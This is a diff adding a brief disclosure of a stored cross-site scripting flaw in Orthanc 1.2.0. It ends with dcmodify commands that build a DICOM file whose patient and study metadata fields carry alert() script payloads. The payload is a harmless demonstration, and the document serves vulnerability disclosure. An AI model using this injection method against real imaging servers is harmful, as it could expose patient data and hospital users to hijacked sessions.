@@ -1,0 +1,21 @@
+Stored Cross Site Scripting (XSS)
+---------------------------------
+
+- Application: Orthanc (1.2.0)
+- Researcher: Victor Pasnkel (Morphus Labs)
+- XSS inside DICOM file (metadata)
+- File can be uploaded to the Web application
+- Tested on: OSX El Capitan (10.11.6)
+
+Source:
+https://drive.google.com/open?id=0B5BZfMPc1T-Ib004SExMZXFNSDg
+
+
+Generation of sample file
+-------------------------
+
+# cp DummyCT.dcm 2017-06-27-XSSInjection.dcm
+# dcmodify -m 'PatientName=HelloWorld<script>alert("XSS inside DICOM file 1");</script>' \
+           -m 'StudyDescription=MyStudy<script>alert("XSS inside DICOM file 2");</script>' \
+           -m 'SeriesDescription=MySeries<script>alert("XSS inside DICOM file 3");</script>' \
+           2017-06-27-XSSInjection.dcm
